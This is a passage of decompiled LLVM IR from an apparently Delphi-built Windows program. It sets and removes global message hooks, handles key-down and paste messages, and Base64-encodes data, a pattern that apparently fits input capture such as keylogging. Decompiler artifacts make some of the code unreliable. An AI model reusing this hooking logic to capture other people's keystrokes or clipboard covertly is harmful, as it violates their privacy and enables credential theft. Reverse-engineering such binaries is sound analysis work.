  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !797
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !798
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !799
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !799
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !799
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !800
  %3 = call i32 @function_4071c0(), !insn.addr !801
  %4 = icmp eq i32 %3, 0, !insn.addr !802
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !803
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !803

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !804
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !805
  %7 = ptrtoint i32* %6 to i32, !insn.addr !805
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !806
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !806
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !807
  %10 = icmp eq i1 %9, false, !insn.addr !808
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !809

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_407020(), !insn.addr !810
  %12 = call i32 @"@LStrAsg"(), !insn.addr !811
  %13 = call i32 @function_407348(), !insn.addr !812
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !813
  br label %dec_label_pc_405214, !insn.addr !813

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_40747c(), !insn.addr !814
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !814
  br label %dec_label_pc_405214, !insn.addr !814

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !815
  %16 = load i32, i32* %15, align 4, !insn.addr !815
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !816
  %17 = add i32 %esp.0.reload, 8, !insn.addr !817
  %18 = inttoptr i32 %17 to i32*, !insn.addr !817
  store i32 4215345, i32* %18, align 4, !insn.addr !817
  %19 = call i32 @"@LStrClr"(), !insn.addr !818
  ret i32 %19, !insn.addr !819
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !820
  ret i32 %0, !insn.addr !820
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !821
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !822
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !823
  %8 = inttoptr i32 %4 to i8*, !insn.addr !823
  store i8 %7, i8* %8, align 1, !insn.addr !823
  %9 = add i32 %2, 111, !insn.addr !824
  %10 = inttoptr i32 %9 to i8*, !insn.addr !824
  %11 = load i8, i8* %10, align 1, !insn.addr !824
  %12 = load i32, i32* %eax, align 4, !insn.addr !824
  %13 = trunc i32 %12 to i8, !insn.addr !824
  %14 = add i8 %11, %13, !insn.addr !824
  store i8 %14, i8* %10, align 1, !insn.addr !824
  %15 = trunc i32 %3 to i16, !insn.addr !825
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !825
  %17 = inttoptr i32 %0 to i32*, !insn.addr !825
  store i32 %16, i32* %17, align 4, !insn.addr !825
  %18 = add i32 %0, 66, !insn.addr !826
  %19 = inttoptr i32 %18 to i64*, !insn.addr !826
  %20 = load i64, i64* %19, align 4, !insn.addr !826
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !826
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !827
  %22 = load i8, i8* %5, align 4, !insn.addr !828
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !828
  %25 = add i8 %22, %24, !insn.addr !828
  %26 = inttoptr i32 %23 to i8*, !insn.addr !828
  store i8 %25, i8* %26, align 1, !insn.addr !828
  %27 = add i32 %21, -117, !insn.addr !829
  %28 = inttoptr i32 %27 to i8*, !insn.addr !829
  %29 = load i8, i8* %28, align 1, !insn.addr !829
  %30 = trunc i32 %3 to i8, !insn.addr !829
  %31 = add i8 %29, %30, !insn.addr !829
  store i8 %31, i8* %28, align 1, !insn.addr !829
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !830
  %33 = add i32 %21, 16, !insn.addr !831
  %34 = inttoptr i32 %33 to i32*, !insn.addr !831
  %35 = load i32, i32* %34, align 4, !insn.addr !831
  %36 = add i32 %21, 12, !insn.addr !832
  %37 = inttoptr i32 %36 to i32*, !insn.addr !832
  %38 = load i32, i32* %37, align 4, !insn.addr !832
  %39 = add i32 %21, 8, !insn.addr !833
  %40 = inttoptr i32 %39 to i32*, !insn.addr !833
  %41 = load i32, i32* %40, align 4, !insn.addr !833
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !834
  %43 = inttoptr i32 %42 to i32*, !insn.addr !835
  %44 = load i32, i32* %43, align 4, !insn.addr !835
  %45 = icmp eq i32 %44, 0, !insn.addr !835
  %46 = icmp eq i1 %45, false, !insn.addr !836
  %47 = icmp eq i32 %41, 0, !insn.addr !837
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !838
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !839

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !840
  %51 = add i32 %35, 4, !insn.addr !841
  %52 = inttoptr i32 %51 to i32*, !insn.addr !841
  %53 = load i32, i32* %52, align 4, !insn.addr !841
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !842
  br label %dec_label_pc_40529a, !insn.addr !843

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !844
  br label %dec_label_pc_40529a, !insn.addr !844

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !845
  %57 = inttoptr i32 %35 to i32*, !insn.addr !846
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !846
  ret i32 %58, !insn.addr !847
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !848
  %5 = icmp eq i1 %4, false, !insn.addr !849
  %6 = icmp eq i32 %arg3, 0, !insn.addr !850
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !851

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !852
  %9 = inttoptr i32 %8 to i32*, !insn.addr !852
  %10 = load i32, i32* %9, align 4, !insn.addr !852
  %11 = icmp eq i32 %10, 2, !insn.addr !853
  %12 = icmp eq i1 %11, false, !insn.addr !854
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !854

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !855
  br label %dec_label_pc_4052e0, !insn.addr !855

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !856
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !857
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !857
  ret i32 %16, !insn.addr !858
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !859
  %2 = ptrtoint i32* %1 to i32, !insn.addr !859
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !860
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !861
  %5 = ptrtoint i32* %4 to i32, !insn.addr !861
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !862
  ret i32 %5, !insn.addr !863
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !864
  %1 = inttoptr i32 %0 to i32*, !insn.addr !865
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !865
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !866
  %4 = inttoptr i32 %3 to i32*, !insn.addr !867
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !867
  %6 = sext i1 %5 to i32, !insn.addr !867
  ret i32 %6, !insn.addr !868
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !869
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !869
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !869
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !870
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !871
  %3 = add i32 %2, 1, !insn.addr !871
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !871
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !872
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !873
  ret i32 0, !insn.addr !874
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !875
  ret i32 %0, !insn.addr !875
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !876
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !877
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !878
  %2 = add i32 %1, -1, !insn.addr !878
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !878
  ret i32 %0, !insn.addr !879
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !880
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !880
  %5 = inttoptr i32 %3 to i32*, !insn.addr !880
  store i32 %4, i32* %5, align 4, !insn.addr !880
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !881
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !881
  %10 = add i8 %7, %9, !insn.addr !881
  %11 = inttoptr i32 %8 to i8*, !insn.addr !881
  store i8 %10, i8* %11, align 1, !insn.addr !881
  %12 = load i32, i32* %eax, align 4, !insn.addr !882
  store i32 %arg1, i32* %eax, align 4, !insn.addr !883
  %13 = add i32 %12, 99, !insn.addr !884
  %14 = inttoptr i32 %13 to i64*, !insn.addr !884
  %15 = load i64, i64* %14, align 4, !insn.addr !884
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !884
  %17 = add i32 %16, -2, !insn.addr !885
  %18 = inttoptr i32 %17 to i16*, !insn.addr !885
  store i16 27241, i16* %18, align 2, !insn.addr !885
  %19 = mul i32 %2, 2, !insn.addr !886
  %20 = add i32 %2, 110, !insn.addr !886
  %21 = add i32 %20, %19, !insn.addr !886
  %22 = inttoptr i32 %21 to i32*, !insn.addr !886
  %23 = load i32, i32* %22, align 4, !insn.addr !886
  %24 = sext i32 %23 to i64, !insn.addr !886
  %25 = mul nsw i64 %24, 111, !insn.addr !886
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !886
  %28 = icmp eq i64 %25, %27, !insn.addr !886
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !887

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !888
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !889

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !888
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !890

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !888
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !635, !insn.addr !888
  %33 = and i8 %32, 1, !insn.addr !888
  %34 = icmp eq i8 %33, 0, !insn.addr !888
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !891

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !882
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !892
  %37 = load i32, i32* %36, align 4, !insn.addr !892
  %38 = xor i32 %37, %1, !insn.addr !892
  store i32 %38, i32* %36, align 4, !insn.addr !892
  %39 = add i32 %1, 959985462, !insn.addr !893
  %40 = inttoptr i32 %39 to i32*, !insn.addr !893
  %41 = load i32, i32* %40, align 4, !insn.addr !893
  %42 = xor i32 %41, %1, !insn.addr !893
  %43 = add i32 %16, -38, !insn.addr !894
  %44 = inttoptr i32 %43 to i32*, !insn.addr !894
  store i32 %35, i32* %44, align 4, !insn.addr !894
  %45 = add i32 %16, -42, !insn.addr !895
  %46 = inttoptr i32 %45 to i32*, !insn.addr !895
  store i32 %42, i32* %46, align 4, !insn.addr !895
  %47 = add i32 %16, -22, !insn.addr !896
  %48 = inttoptr i32 %47 to i32*, !insn.addr !896
  store i32 0, i32* %48, align 4, !insn.addr !896
  %49 = add i32 %16, -26, !insn.addr !897
  %50 = inttoptr i32 %49 to i32*, !insn.addr !897
  store i32 0, i32* %50, align 4, !insn.addr !897
  %51 = add i32 %16, -30, !insn.addr !898
  %52 = inttoptr i32 %51 to i32*, !insn.addr !898
  store i32 0, i32* %52, align 4, !insn.addr !898
  %53 = add i32 %16, -34, !insn.addr !899
  %54 = inttoptr i32 %53 to i32*, !insn.addr !899
  store i32 0, i32* %54, align 4, !insn.addr !899
  %55 = add i32 %16, -6, !insn.addr !900
  %56 = inttoptr i32 %55 to i32*, !insn.addr !900
  store i32 %arg3, i32* %56, align 4, !insn.addr !900
  %57 = add i32 %16, -46, !insn.addr !901
  %58 = inttoptr i32 %57 to i32*, !insn.addr !901
  store i32 %17, i32* %58, align 4, !insn.addr !901
  ret i32 0, !insn.addr !901

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !902
  %60 = trunc i64 %25 to i32, !insn.addr !886
  %61 = load i32, i32* %eax, align 4, !insn.addr !903
  %62 = add i32 %61, 1, !insn.addr !903
  %63 = mul i32 %59, 8, !insn.addr !904
  %64 = add i32 %59, 48, !insn.addr !904
  %65 = add i32 %64, %63, !insn.addr !904
  %66 = inttoptr i32 %65 to i8*, !insn.addr !904
  %67 = load i8, i8* %66, align 4, !insn.addr !904
  %68 = udiv i32 %62, 256, !insn.addr !904
  %69 = trunc i32 %68 to i8, !insn.addr !904
  %70 = add i8 %67, %69, !insn.addr !904
  store i8 %70, i8* %66, align 4, !insn.addr !904
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !905
  %71 = call i32 @"@LStrClr"(), !insn.addr !906
  %72 = call i32 @function_4034c8(), !insn.addr !907
  %73 = add i32 %60, -8, !insn.addr !908
  %74 = inttoptr i32 %73 to i32*, !insn.addr !908
  store i32 %72, i32* %74, align 4, !insn.addr !908
  %75 = ashr i32 %72, 31, !insn.addr !909
  %76 = zext i32 %72 to i64, !insn.addr !910
  %77 = zext i32 %75 to i64, !insn.addr !910
  %78 = mul i64 %77, 4294967296, !insn.addr !910
  %79 = or i64 %78, %76, !insn.addr !910
  %80 = sdiv i64 %79, 3, !insn.addr !910
  %81 = trunc i64 %80 to i32, !insn.addr !910
  store i32 %81, i32* %eax, align 4, !insn.addr !910
  %82 = srem i64 %79, 3, !insn.addr !910
  %83 = trunc i64 %82 to i32, !insn.addr !910
  %84 = icmp eq i32 %83, 0, !insn.addr !911
  %85 = icmp eq i1 %84, false, !insn.addr !912
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !912

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !913
  %87 = ashr i32 %86, 31, !insn.addr !914
  %88 = zext i32 %86 to i64, !insn.addr !915
  %89 = zext i32 %87 to i64, !insn.addr !915
  %90 = mul i64 %89, 4294967296, !insn.addr !915
  %91 = or i64 %90, %88, !insn.addr !915
  %92 = sdiv i64 %91, 3, !insn.addr !915
  %93 = trunc i64 %92 to i32, !insn.addr !915
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !916
  br label %dec_label_pc_405430, !insn.addr !916

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !916

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !917
  ret i32 %94, !insn.addr !917

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !918
  %96 = zext i32 %95 to i64, !insn.addr !918
  %97 = zext i32 %arg3 to i64, !insn.addr !918
  %98 = mul i64 %97, 4294967296, !insn.addr !918
  %99 = or i64 %98, %96, !insn.addr !918
  %100 = zext i32 %arg2 to i64, !insn.addr !918
  %101 = sdiv i64 %99, %100, !insn.addr !918
  %102 = trunc i64 %101 to i32, !insn.addr !918
  %103 = add i32 %102, 1, !insn.addr !919
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !919
  br label %dec_label_pc_405430, !insn.addr !919

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !920
  ret i32 %104, !insn.addr !921

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !922
  %106 = load i32, i32* %105, align 4, !insn.addr !922
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !922
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !923
  %109 = load i32, i32* %108, align 4, !insn.addr !923
  %110 = add i32 %109, %107, !insn.addr !923
  store i32 %110, i32* %108, align 4, !insn.addr !923
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !924
  %113 = inttoptr i32 %112 to i8*, !insn.addr !924
  %114 = load i8, i8* %113, align 1, !insn.addr !924
  %115 = trunc i32 %111 to i8, !insn.addr !924
  %116 = add i8 %114, %115, !insn.addr !924
  store i8 %116, i8* %113, align 1, !insn.addr !924
  %117 = load i32, i32* %eax, align 4, !insn.addr !925
  ret i32 %117, !insn.addr !925
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !926
  %esp.0.reg2mem = alloca i32, !insn.addr !926
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !927
  %3 = inttoptr i32 %2 to i32*, !insn.addr !927
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !928
  %13 = inttoptr i32 %12 to i32*, !insn.addr !928
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !926
  br label %dec_label_pc_40543e, !insn.addr !926

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !929
  %25 = add i32 %24, 3, !insn.addr !930
  %26 = load i32, i32* %3, align 4, !insn.addr !927
  %27 = icmp sgt i32 %25, %26, !insn.addr !931
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !931

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !932
  %29 = inttoptr i32 %28 to i8*, !insn.addr !932
  %30 = load i8, i8* %29, align 1, !insn.addr !932
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !933
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !934
  %34 = inttoptr i32 %33 to i8*, !insn.addr !934
  %35 = load i8, i8* %34, align 1, !insn.addr !934
  store i8 %35, i8* %5, align 1, !insn.addr !935
  %36 = load i8, i8* %29, align 1, !insn.addr !936
  %37 = mul i8 %36, 16, !insn.addr !937
  %38 = and i8 %37, 48, !insn.addr !938
  %39 = add i32 %28, 1, !insn.addr !939
  %40 = inttoptr i32 %39 to i8*, !insn.addr !939
  %41 = load i8, i8* %40, align 1, !insn.addr !939
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !940
  %44 = zext i8 %43 to i32, !insn.addr !940
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !941
  %46 = inttoptr i32 %45 to i8*, !insn.addr !941
  %47 = load i8, i8* %46, align 1, !insn.addr !941
  store i8 %47, i8* %7, align 1, !insn.addr !942
  %48 = load i8, i8* %40, align 1, !insn.addr !943
  %49 = mul i8 %48, 4, !insn.addr !944
  %50 = and i8 %49, 60, !insn.addr !945
  %51 = add i32 %28, 2, !insn.addr !946
  %52 = inttoptr i32 %51 to i8*, !insn.addr !946
  %53 = load i8, i8* %52, align 1, !insn.addr !946
  %54 = udiv i8 %53, 64, !insn.addr !947
  %55 = or i8 %54, %50, !insn.addr !948
  %56 = zext i8 %55 to i32, !insn.addr !948
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !949
  %58 = inttoptr i32 %57 to i8*, !insn.addr !949
  %59 = load i8, i8* %58, align 1, !insn.addr !949
  store i8 %59, i8* %9, align 1, !insn.addr !950
  %60 = and i8 %53, 63, !insn.addr !951
  %61 = zext i8 %60 to i32, !insn.addr !951
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !952
  %63 = inttoptr i32 %62 to i8*, !insn.addr !952
  %64 = load i8, i8* %63, align 1, !insn.addr !952
  store i8 %64, i8* %11, align 1, !insn.addr !953
  br label %dec_label_pc_405589, !insn.addr !954

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !955
  %66 = icmp sgt i32 %65, %26, !insn.addr !956
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !956

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !957
  %77 = and i8 %76, 48, !insn.addr !958
  %78 = add i32 %67, 1, !insn.addr !959
  %79 = inttoptr i32 %78 to i8*, !insn.addr !959
  %80 = load i8, i8* %79, align 1, !insn.addr !959
  %81 = zext i8 %80 to i32, !insn.addr !959
  %82 = udiv i8 %80, 16, !insn.addr !960
  %83 = or i8 %82, %77, !insn.addr !961
  %84 = zext i8 %83 to i32, !insn.addr !961
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !962
  %86 = inttoptr i32 %85 to i8*, !insn.addr !962
  %87 = load i8, i8* %86, align 1, !insn.addr !962
  store i8 %87, i8* %7, align 1, !insn.addr !963
  %88 = mul i32 %81, 4, !insn.addr !964
  %89 = and i32 %88, 60, !insn.addr !965
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !966
  %91 = inttoptr i32 %90 to i8*, !insn.addr !966
  %92 = load i8, i8* %91, align 4, !insn.addr !966
  store i8 %92, i8* %9, align 1, !insn.addr !967
  store i8 61, i8* %11, align 1, !insn.addr !968
  br label %dec_label_pc_405589, !insn.addr !969

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !970
  %94 = mul i32 %93, 16, !insn.addr !971
  %95 = and i32 %94, 48, !insn.addr !972
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !973
  %97 = inttoptr i32 %96 to i8*, !insn.addr !973
  %98 = load i8, i8* %97, align 16, !insn.addr !973
  store i8 %98, i8* %7, align 1, !insn.addr !974
  store i8 61, i8* %9, align 1, !insn.addr !975
  store i8 61, i8* %11, align 1, !insn.addr !976
  br label %dec_label_pc_405589, !insn.addr !976

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !928
  %100 = inttoptr i32 %99 to i32*, !insn.addr !977
  %101 = load i32, i32* %100, align 4, !insn.addr !977
  %102 = add i32 %esp.0.reload, -4, !insn.addr !977
  %103 = inttoptr i32 %102 to i32*, !insn.addr !977
  store i32 %101, i32* %103, align 4, !insn.addr !977
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !978
  %105 = load i32, i32* %15, align 4, !insn.addr !979
  %106 = add i32 %esp.0.reload, -8, !insn.addr !979
  %107 = inttoptr i32 %106 to i32*, !insn.addr !979
  store i32 %105, i32* %107, align 4, !insn.addr !979
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !980
  %109 = load i32, i32* %17, align 4, !insn.addr !981
  %110 = add i32 %esp.0.reload, -12, !insn.addr !981
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !981
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !982
  %113 = load i32, i32* %19, align 4, !insn.addr !983
  %114 = add i32 %esp.0.reload, -16, !insn.addr !983
